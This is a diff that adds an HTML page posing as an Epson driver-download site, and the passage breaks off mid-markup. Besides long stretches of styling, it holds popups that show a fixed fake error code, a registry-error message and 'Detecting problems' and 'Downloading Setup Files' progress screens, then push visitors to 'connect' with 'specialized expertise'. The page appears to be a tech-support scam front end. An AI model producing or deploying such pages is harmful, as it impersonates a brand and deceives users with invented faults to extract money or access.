@@ -1,0 +1,2190 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Epson Printers - Download Drivers</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Edu+VIC+WA+NT+Hand:wght@400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Special+Gothic:wght@400..700&display=swap"
+        rel="stylesheet">
+
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+
+    <!-- Remix Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f8f8f8;
+        }
+
+        header {
+            background-color: #fff;
+            padding: 8px 60px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo {
+            height: 45px;
+            display: flex;
+            align-items: center;
+            padding-left: 20px;
+        }
+
+        .logo img {
+            height: 38px;
+            width: auto;
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            gap: 5px;
+            position: absolute;
+            right: 20px;
+        }
+
+        .hamburger span {
+            width: 25px;
+            height: 3px;
+            background-color: #333;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .hamburger.active span:nth-child(1) {
+            transform: rotate(45deg) translate(10px, 10px);
+        }
+
+        .hamburger.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .hamburger.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+
+        nav {
+            margin: 0 auto;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 30px;
+        }
+
+        nav a {
+            text-decoration: none;
+            color: #6a6969;
+            font-size: 13px;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        nav .active {
+            color: #2e2d2d !important;
+        }
+
+        nav a:hover {
+            color: #2e2d2d;
+        }
+
+        .hero {
+            background: linear-gradient(135deg, #005a87 0%, #0087c9 50%, #00a8e6 100%);
+            padding: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 450px;
+            position: relative;
+            overflow: hidden;
+            background-image: url('https://digitalblitzjk.com/printers/printer-install/hp/new-top_background_image.png');
+            background-position: center;
+            background-size: cover;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 800px;
+            height: 800px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero-content {
+            flex: 1;
+            z-index: 2;
+            color: white;
+        }
+
+        .hero h1 {
+            font-size: 28px;
+            line-height: 34px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .hero ul {
+            list-style: none;
+            margin-bottom: 35px;
+            padding-left: 20px;
+        }
+
+        .hero li {
+            font-size: 16px;
+            margin-bottom: 0px;
+            display: flex;
+            align-items: center;
+            font-weight: 400;
+            line-height: 23px;
+        }
+
+        .hero li:before {
+            content: '•';
+            margin-right: 15px;
+            font-size: 24px;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background-color: #0096d6;
+            color: white;
+            padding: 14px 40px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 150, 214, 0.3);
+        }
+
+        /* .download-btn:hover {
+            background-color: #0078a8;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 150, 214, 0.4);
+        } */
+
+        .download-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .hero-images {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .printers-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            transform: perspective(1200px) rotateY(-10deg);
+        }
+
+        .printers-stack img {
+            width: 273px;
+        }
+
+        .printer-item {
+            text-align: center;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .printer-item:nth-child(1) {
+            animation-delay: 0s;
+            transform: translateY(20px);
+        }
+
+        .printer-item:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+
+        .printer-item:nth-child(3) {
+            animation-delay: 0.6s;
+            transform: translateY(-20px);
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .printer-item img {
+            max-width: 280px;
+            height: auto;
+            filter: drop-shadow(0 10px 25px rgba(0, 0, 0, 0.2));
+        }
+
+        .container-main {
+            display: flex;
+            justify-content: space-between;
+            margin: 0 auto;
+            padding: 20px 70px;
+            margin-left: 20px;
+        }
+
+        .section-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 15px;
+            color: #212529;
+        }
+
+        .heading-fill-form {
+            margin-bottom: 20px;
+            font-weight: 600;
+            line-height: 19px;
+            color: #454545;
+        }
+
+        .download-btn {
+            padding: 12px 40px;
+        }
+
+        .input-btn-section {
+            padding-left: 30px;
+        }
+
+        .input-btn-section input {
+            margin: 10px 0px;
+        }
+
+        .input-btn-section button {
+            margin-top: 10px;
+        }
+
+        .form-section {
+            background: white;
+            padding: 40px;
+            border-radius: 6px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 40px;
+        }
+
+        .form-section h3 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .form-section p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .connection-options {
+            display: flex;
+            gap: 15px;
+        }
+
+        .radio-option {
+            flex: 1;
+        }
+
+        .radio-option input[type="radio"] {
+            display: none;
+        }
+
+        .radio-option label {
+            display: block;
+            padding: 12px 16px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 0;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .radio-option input[type="radio"]:checked+label {
+            border-color: #0096d6;
+            background-color: #e6f5fb;
+            color: #0096d6;
+        }
+
+        input[type="text"],
+        select {
+            height: 58px;
+            padding: 0 18px;
+            border: 1px solid #dbe4f0;
+            border-radius: 14px;
+            font-size: 15px;
+            outline: none;
+            transition: .3s;
+            background: #fafcff;
+            width: 100%;
+        }
+
+        input[type="text"]:focus,
+        select:focus {
+            outline: none;
+            border-color: #0096d6;
+            box-shadow: 0 0 0 3px rgba(0, 150, 214, 0.1);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+
+        .button-group button {
+            flex: 1;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .button-group .btn-submit {
+            background-color: #0096d6;
+            color: white;
+        }
+
+        .button-group .btn-submit:hover {
+            background-color: #0078a8;
+        }
+
+        .button-group .btn-reset {
+            background-color: #f5f5f5;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+
+        .button-group .btn-reset:hover {
+            background-color: #efefef;
+        }
+
+        .wait-msg {
+            display: none;
+            color: #666;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .info-box {
+            background: #F8F8F8;
+            padding: 30px;
+            border-radius: 6px;
+        }
+
+        .info-box h4 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .info-box p {
+            color: #666666;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .info-box img {
+            width: 526px;
+            height: auto;
+            border-radius: 4px;
+            margin-top: 15px;
+        }
+
+        .footer-img {
+            padding: 60px;
+            background-color: #F2F6F7;
+        }
+
+        .footer-img img {
+            object-fit: cover;
+            width: 100%;
+            height: auto;
+        }
+
+        footer {
+            background-color: #f8f8f8;
+            border-top: 1px solid #e5e5e5;
+            padding: 30px 50px;
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+        }
+
+        footer a {
+            color: #0096d6;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 1024px) {
+            .container-main {
+                padding: 20px 40px;
+                margin-left: 10px;
+                flex-direction: column;
+            }
+
+            .hero {
+                padding: 50px;
+            }
+
+            .info-box img {
+                width: 100%;
+                max-width: 450px;
+            }
+
+            .fill-form {
+                margin-bottom: 20px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            header {
+                padding: 12px 20px;
+                position: relative;
+            }
+
+            .logo {
+                padding-left: 0;
+            }
+
+            .hamburger {
+                display: flex;
+            }
+
+            nav {
+                display: block;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: #fff;
+                z-index: 9999;
+
+                max-height: 0;
+                overflow: hidden;
+                transition: max-height .3s ease;
+            }
+
+            nav.active {
+                max-height: 300px;
+            }
+
+            nav ul {
+                flex-direction: column;
+                gap: 0;
+                padding: 15px 20px;
+                margin: 0;
+            }
+
+            nav li {
+                padding: 10px 0;
+                border-bottom: 1px solid #f0f0f0;
+            }
+
+            nav li:last-child {
+                border-bottom: none;
+            }
+
+            nav a {
+                font-size: 14px;
+            }
+
+            .hero {
+                flex-direction: column;
+                padding: 40px 20px;
+                min-height: auto;
+                justify-content: center;
+            }
+
+            .hero-content {
+                /* text-align: center; */
+                width: 100%;
+            }
+
+            .hero h1 {
+                font-size: 24px;
+                margin-bottom: 15px;
+                line-height: 30px;
+            }
+
+            .hero ul {
+                margin-bottom: 25px;
+                padding-left: 0;
+                text-align: left;
+            }
+
+            .hero li {
+                font-size: 14px;
+                line-height: 20px;
+            }
+
+            .hero-images {
+                margin-top: 30px;
+                width: 100%;
+            }
+
+            .printers-stack {
+                gap: 10px;
+                transform: none;
+            }
+
+            .printers-stack img {
+                min-width: auto;
+                max-width: 200px;
+            }
+
+            .printer-item {
+                animation: none;
+            }
+
+            .printer-item:nth-child(1) {
+                transform: none;
+            }
+
+            .printer-item:nth-child(3) {
+                transform: none;
+            }
+
+            .printer-item img {
+                max-width: 150px;
+            }
+
+            .container-main {
+                display: block;
+                padding: 20px;
+                margin-left: 0;
+            }
+
+            .fill-form {
+                margin-bottom: 30px;
+            }
+
+            .section-title {
+                font-size: 20px;
+                margin-bottom: 12px;
+            }
+
+            .heading-fill-form {
+                font-size: 14px;
+                margin-bottom: 15px;
+            }
+
+            .input-btn-section {
+                padding-left: 0;
+            }
+
+            .input-btn-section input {
+                margin: 8px 0;
+                font-size: 14px;
+            }
+
+            .input-btn-section button {
+                margin-top: 8px;
+                width: 60%;
+                padding: 10px 20px;
+            }
+
+            .download-btn {
+                width: 50%;
+                padding: 10px 20px !important;
+                font-size: 14px;
+                justify-content: center;
+            }
+
+            .info-box {
+                background: #F8F8F8;
+                padding: 20px;
+            }
+
+            .info-box h4 {
+                font-size: 16px;
+                margin-bottom: 8px;
+            }
+
+            .info-box p {
+                font-size: 14px;
+                margin-bottom: 12px;
+            }
+
+            .info-box img {
+                width: 100%;
+                height: auto;
+                max-width: 100%;
+            }
+
+            .connection-list {
+                display: block !important;
+            }
+
+            .footer-img {
+                padding: 30px 20px;
+            }
+
+            footer {
+                padding: 20px;
+                font-size: 12px;
+            }
+
+            .connection-options {
+                flex-direction: column;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 480px) {
+            header {
+                padding: 10px 15px;
+            }
+
+            .logo img {
+                height: 30px;
+            }
+
+            nav ul {
+                gap: 8px;
+                font-size: 11px;
+            }
+
+
+            .hero {
+                padding: 25px 15px;
+                min-height: auto;
+            }
+
+            .hero h1 {
+                font-size: 20px;
+                margin-bottom: 12px;
+                line-height: 26px;
+            }
+
+            .hero ul {
+                margin-bottom: 20px;
+                padding-left: 0;
+            }
+
+            .hero li {
+                font-size: 12px;
+                line-height: 18px;
+                margin-bottom: 5px;
+            }
+
+            .hero li:before {
+                font-size: 18px;
+                margin-right: 10px;
+            }
+
+            .download-btn {
+                padding: 10px 15px !important;
+                font-size: 12px;
+                gap: 8px;
+            }
+
+            .download-btn svg {
+                width: 14px;
+                height: 14px;
+            }
+
+            .hero-images {
+                margin-top: 20px;
+            }
+
+            .printer-item img {
+                max-width: 100px;
+            }
+
+            .container-main {
+                padding: 15px;
+                margin-left: 0;
+            }
+
+            .section-title {
+                font-size: 16px;
+                margin-bottom: 10px;
+            }
+
+            .heading-fill-form {
+                font-size: 12px;
+            }
+
+            .input-btn-section {
+                padding-left: 0;
+            }
+
+            .input-btn-section label {
+                font-size: 11px;
+                margin-bottom: 6px;
+            }
+
+            .input-btn-section input {
+                padding: 8px 10px;
+                font-size: 12px;
+                margin: 6px 0;
+            }
+
+            .input-btn-section button {
+                font-size: 11px;
+                padding: 10px 12px !important;
+            }
+
+            .info-box {
+                padding: 15px;
+            }
+
+            .info-box h4 {
+                font-size: 14px;
+            }
+
+            .info-box p {
+                font-size: 12px;
+            }
+
+            .footer-img {
+                padding: 15px;
+            }
+
+            footer {
+                padding: 12px 10px;
+                font-size: 10px;
+            }
+        }
+
+        /*================ POPUP ================*/
+
+        .popup-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, .55);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: .35s;
+            z-index: 9999;
+        }
+
+        .popup-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .popup {
+            width: 550px;
+            background: #fff;
+            border-radius: 24px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            text-align: center;
+            position: relative;
+            padding: 45px 35px;
+            transform: scale(.8);
+            transition: .35s;
+            box-shadow: 0 35px 80px rgba(0, 0, 0, .25);
+            /* max-height: 90vh; */
+        }
+
+        .popup::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .popup::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+
+        .popup::-webkit-scrollbar-thumb {
+            background: #0096d6;
+            border-radius: 10px;
+        }
+
+        .popup::-webkit-scrollbar-thumb:hover {
+            background: #0078a8;
+        }
+
+        .popup {
+            scrollbar-width: thin;
+            scrollbar-color: #0096d6 #f1f1f1;
+        }
+
+        .popup-overlay.active .popup {
+            transform: scale(0.9);
+        }
+
+        .popup-close {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            width: 42px;
+            height: 42px;
+            border: none;
+            border-radius: 50%;
+            background: #f5f7fb;
+            cursor: pointer;
+            font-size: 24px;
+            transition: .3s;
+        }
+
+        .popup-close:hover {
+            background: #2563eb;
+            color: #fff;
+            transform: rotate(90deg);
+        }
+
+        .popup h2 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .popup p {
+            font-size: 1.1rem;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .popup-image img {
+            width: 260px;
+            margin: auto;
+            display: block;
+        }
+
+        .popup-btn {
+            text-decoration: none;
+            margin-top: 40px;
+            display: inline-flex;
+            align-items: center;
+            gap: .8rem;
+            padding: 18px 34px;
+            background: linear-gradient(135deg, #2563eb, #3b82f6);
+            color: #fff;
+            border-radius: 60px;
+            font-size: 1rem;
+            font-weight: 700;
+            box-shadow: 0 18px 45px rgba(37, 99, 235, .28);
+            transition: .4s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .popup-btn:hover {
+            transform: translateY(-5px);
+        }
+
+        .popup-btn i {
+            font-size: 28px;
+        }
+
+        .connection-popup {
+            max-width: 700px;
+            max-height: 100vh;
+            overflow-y: auto;
+        }
+
+        .connection-list {
+            display: flex;
+            gap: 30px;
+            margin-top: 40px;
+            justify-content: center;
+        }
+
+        .connection-item {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .connection-item img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .connection-item .popup-btn {
+            margin-top: 15px;
+            width: 90%;
+        }
+
+        .detecting-heading {
+            font-size: 1.8rem;
+            color: #0096d6;
+            font-weight: 600;
+            margin: 40px 0;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 40px 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: #0096d6;
+            width: 0%;
+            animation: progress 3s ease-in-out;
+        }
+
+        @keyframes progress {
+            0% {
+                width: 0%;
+            }
+
+            50% {
+                width: 70%;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        /* Loading State */
+        .loading-state {
+            display: none;
+            text-align: center;
+        }
+
+        .loading-state.active {
+            display: block;
+        }
+
+        .loader-icon {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0096d6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            font-size: 1rem;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .loading-text .dot {
+            animation: dots 1.4s infinite;
+        }
+
+        .loading-text .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading-text .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dots {
+
+            0%,
+            60%,
+            100% {
+                opacity: 0.3;
+            }
+
+            30% {
+                opacity: 1;
+            }
+        }
+
+        .driver-popup {
+            max-width: 700px;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .driver-popup h2 {
+            padding: 28px 35px;
+            border-bottom: 1px solid #eee;
+            margin: 0;
+            text-align: left;
+        }
+
+        .driver-content {
+            padding: 45px;
+            background: #f8fbff;
+        }
+
+        .driver-content h3 {
+            text-align: center;
+            font-size: 30px;
+            margin-bottom: 35px;
+        }
+
+        .driver-content label {
+            display: block;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .driver-content input {
+            width: 100%;
+            height: 60px;
+            border: 1px solid #dbe4f0;
+            border-radius: 12px;
+            padding: 0 18px;
+            font-size: 17px;
+            margin-bottom: 30px;
+            outline: none;
+            transition: .3s;
+        }
+
+        .driver-content input:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, .08);
+        }
+
+        .full-btn {
+            width: 100%;
+            justify-content: center;
+        }
+
+        /* =========================================
+           DOWNLOAD SETUP FILES POPUP
+           ========================================= */
+
+        .download-setup-popup {
+            max-width: 550px;
+            width: 100%;
+            text-align: center;
+            margin: 10px;
+        }
+
+        .download-setup-icon {
+            width: 78px;
+            height: 78px;
+            margin: 5px auto 22px;
+            border-radius: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #e8f7ff, #f1f8ff);
+            color: #0797d5;
+            font-size: 38px;
+            box-shadow: 0 12px 30px rgba(7, 151, 213, .12);
+        }
+
+        .download-setup-icon i {
+            animation: downloadIconFloat 1.6s ease-in-out infinite;
+        }
+
+        @keyframes downloadIconFloat {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-6px);
+            }
+        }
+
+        .download-setup-popup h2 {
+            margin: 0 0 10px;
+        }
+
+        .download-setup-description {
+            max-width: 450px;
+            margin: 0 auto 25px !important;
+            color: #737b86 !important;
+            font-size: .93rem !important;
+            line-height: 1.6;
+        }
+
+        .download-progress-container {
+            width: 100%;
+            height: 10px;
+            background: #e6e9ed;
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 11px;
+        }
+
+        .download-progress-bar {
+            width: 0%;
+            height: 100%;
+            border-radius: inherit;
+            background: linear-gradient(90deg, #0797d5, #2563eb);
+            transition: width .45s ease;
+            position: relative;
+        }
+
+        .download-progress-bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -40%;
+            width: 40%;
+            height: 100%;
+            background: rgba(255, 255, 255, .4);
+            animation: progressShine 1.2s linear infinite;
+        }
+
+        @keyframes progressShine {
+            from {
+                left: -40%;
+            }
+
+            to {
+                left: 110%;
+            }
+        }
+
+        .download-progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            font-size: .86rem;
+            color: #737b86;
+        }
+
+        .download-progress-info strong {
+            color: #0797d5;
+            font-size: .9rem;
+        }
+
+        .download-current-task {
+            margin-top: 20px;
+            min-height: 24px;
+            color: #666;
+            font-size: .88rem;
+        }
+
+        .download-current-task i {
+            color: #0797d5;
+            margin-right: 5px;
+        }
+
+        .download-file-list {
+            margin-top: 22px;
+            padding: 10px;
+            border-radius: 15px;
+            background: #f7faff;
+            border: 1px solid #e6edf5;
+        }
+
+        .download-file-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 11px;
+            border-radius: 10px;
+            text-align: left;
+            transition: all .3s ease;
+        }
+
+        .download-file-icon {
+            width: 38px;
+            height: 38px;
+            flex: 0 0 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #eaf6ff;
+            color: #0797d5;
+            font-size: 18px;
+        }
+
+        .download-file-content {
+            flex: 1;
+            min-width: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+        }
+
+        .download-file-content strong {
+            color: #374151;
+            font-size: .84rem;
+        }
+
+        .download-file-content span {
+            color: #9299a3;
+            font-size: .74rem;
+        }
+
+        .download-file-check {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #aeb5bd;
+            font-size: 18px;
+        }
+
+        .download-file-item.downloading {
+            background: #eef8ff;
+        }
+
+        .download-file-item.downloading .download-file-check {
+            color: #0797d5;
+        }
+
+        .download-file-item.completed {
+            background: #f0faf4;
+        }
+
+        .download-file-item.completed .download-file-icon {
+            background: #e3f7ea;
+            color: #16a34a;
+        }
+
+        .download-file-item.completed .download-file-check {
+            color: #16a34a;
+        }
+
+        .download-setup-footer {
+            margin-top: 18px;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: #fafafa;
+            color: #9299a3;
+            font-size: .72rem;
+            line-height: 1.5;
+        }
+
+        .download-setup-footer i {
+            color: #0797d5;
+            margin-right: 4px;
+        }
+
+        @media (max-width: 600px) {
+            .download-setup-popup {
+                padding: 30px 16px 20px;
+            }
+
+            .download-setup-popup h2 {
+                font-size: 1.35rem;
+            }
+
+            .download-setup-description {
+                font-size: .84rem !important;
+            }
+
+            .download-file-item {
+                padding: 9px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Popup 1: Initial Download Popup -->
+    <div class="popup-overlay" id="downloadPopup">
+        <div class="popup">
+            <button class="popup-close" onclick="closePopup('downloadPopup')">
+                <i class="ri-close-line"></i>
+            </button>
+            <h2>Quick Download Free Drivers</h2>
+            <p>Start Printer Setup Wizard</p>
+            <div class="popup-image">
+                <img src="../assets/images/img-1_popup.png" alt="Printer">
+            </div>
+            <button class="popup-btn" onclick="goToPopup('downloadPopup', 'driverPopup')">
+                Let's Start
+                <i class="ri-arrow-right-circle-fill"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Popup 2: Driver Form Popup -->
+    <div class="popup-overlay" id="driverPopup">
+        <div class="popup">
+            <button class="popup-close" onclick="closePopup('driverPopup')">
+                <i class="ri-close-line"></i>
+            </button>
+            <h2>Quick Download Free Drivers</h2>
+            <div class="popup-image">
+                <img src="./assets/images/printer-popup.png" alt="">
+            </div>
+            <p>Fill the form and download your printer driver</p>
+            <form id="driverForm" onsubmit="submitDriverForm(event)">
+                <div class="form-group">
+                    <label>Model Number</label>
+                    <input type="text" id="printerModel" required placeholder="Ex:EcoTank L3250">
+                </div>
+                <button type="submit" class="popup-btn">
+                    Quick Download & Install Drivers
+                    <i class="ri-download-2-line"></i>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Popup 3: Error Code Popup -->
+    <div class="popup-overlay" id="errorCodePopup">
+        <div class="popup">
+            <button class="popup-close" onclick="closePopup('errorCodePopup')">
+                <i class="ri-close-line"></i>
+            </button>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120"
+                style="width: 80px; margin: 20px auto; display: block;">
+                <rect x="25" y="35" width="70" height="50" rx="5" fill="none" stroke="#333" stroke-width="2" />
+                <rect x="30" y="30" width="60" height="8" rx="2" fill="none" stroke="#333" stroke-width="2" />
+                <rect x="35" y="45" width="50" height="6" fill="#f5f5f5" stroke="#666" stroke-width="1" />
+                <circle cx="75" cy="55" r="18" fill="#e74c3c" />
+                <text x="75" y="62" font-size="24" font-weight="bold" fill="white" text-anchor="middle">!</text>
+            </svg>
+            <h2 style="margin: 20px 0 10px; font-size: 1.8rem;">Error Code <span style="color: #0096d6;"
+                    id="dynamicErrorCode">0x00000709</span></h2>
+            <p style="color: #666; font-size: 0.95rem; line-height: 1.6; margin-bottom: 20px;" id="dynamicErrorMessage">
+                Registry error found, please check your registry files settings or reinstall drivers.
+            </p>
+            <p style="color: #0096d6; font-size: 1rem; font-weight: 600; margin-bottom: 30px;">
+                Access specialized expertise.
+            </p>
+            <div style="display: flex; gap: 12px; margin-top: 20px;">
+                <button class="popup-btn" onclick="goFromErrorCodeToForm()" style="flex: 1;">
+                    Let's Connect Us
+                    <i class="ri-arrow-right-circle-fill"></i>
+                </button>
+                <button class="popup-btn" onclick="fixIssueFromErrorCode()"
+                    style="flex: 1; background: linear-gradient(135deg, #e74c3c, #c0392b);">
+                    Fix Issue
+                    <i class="ri-tools-line"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+    <!-- Download Setup Files Popup -->
+    <div class="popup-overlay" id="downloadSetupPopup">
+        <div class="popup download-setup-popup">
+
+            <button class="popup-close" onclick="closePopup('downloadSetupPopup')">
+                <i class="ri-close-line"></i>
+            </button>
+
+            <div class="download-setup-icon">
+                <i class="ri-download-cloud-2-line"></i>
+            </div>
+
+            <h2>Downloading Setup Files</h2>
+
+            <p class="download-setup-description">
+                Please wait while we download and prepare the required printer setup files.
+            </p>
+
+            <div class="download-progress-container">
+                <div class="download-progress-bar" id="downloadSetupProgress"></div>
+            </div>
+
+            <div class="download-progress-info">
+                <span id="downloadSetupStatus">Preparing setup files...</span>
+                <strong id="downloadSetupPercent">0%</strong>
+            </div>
+
+            <div class="download-current-task" id="downloadSetupTask">
+                <i class="ri-loader-4-line ri-spin"></i>
+                Connecting to setup service...
+            </div>
+
+            <div class="download-file-list">
+
+                <div class="download-file-item" id="setupFilePackage">
+                    <div class="download-file-icon">
+                        <i class="ri-folder-download-line"></i>
+                    </div>
+                    <div class="download-file-content">
+                        <strong>Printer Setup Package</strong>
+                        <span>Waiting...</span>
+                    </div>
+                    <div class="download-file-check">
+                        <i class="ri-time-line"></i>
+                    </div>
+                </div>
+
+                <div class="download-file-item" id="setupFileDrivers">
+                    <div class="download-file-icon">
+                        <i class="ri-hard-drive-3-line"></i>
+                    </div>
+                    <div class="download-file-content">
+                        <strong>Driver Components</strong>
+                        <span>Waiting...</span>
+                    </div>
+                    <div class="download-file-check">
+                        <i class="ri-time-line"></i>
+                    </div>
+                </div>
+
+                <div class="download-file-item" id="setupFileTools">
+                    <div class="download-file-icon">
+                        <i class="ri-tools-line"></i>
+                    </div>
+                    <div class="download-file-content">
+                        <strong>Diagnostic Tools</strong>
+                        <span>Waiting...</span>
+                    </div>
+                    <div class="download-file-check">
+                        <i class="ri-time-line"></i>
+                    </div>
+                </div>
+
+                <div class="download-file-item" id="setupFileVerify">
+                    <div class="download-file-icon">
+                        <i class="ri-shield-check-line"></i>
+                    </div>
+                    <div class="download-file-content">
+                        <strong>Setup Verification</strong>
+                        <span>Waiting...</span>
+                    </div>
+                    <div class="download-file-check">
+                        <i class="ri-time-line"></i>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Detecting Popup for Fix Issue flow -->
+    <div class="popup-overlay" id="detectingPopup">
+        <div class="popup">
+            <h2 style="margin-bottom: 30px;">Quick Download Free Drivers</h2>
+            <div class="detecting-state" id="detectingStateInPopup" style="display: block;">
+                <h3 class="detecting-heading">Detecting problems</h3>
+                <div class="progress-bar-container">
+                    <div class="progress-bar"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup 4: Connection Selection Popup -->
+    <div class="popup-overlay" id="connectionPopup">
+        <div class="popup connection-popup">
+            <button class="popup-close" onclick="closePopup('connectionPopup')">
+                <i class="ri-close-line"></i>
+            </button>
+            <h2>Quick Download Free Drivers</h2>
+            <p>Select Wi-Fi or USB Connection</p>
+
+            <div class="connection-list" id="connectionList">
+                <!-- USB -->
+                <div class="connection-item">
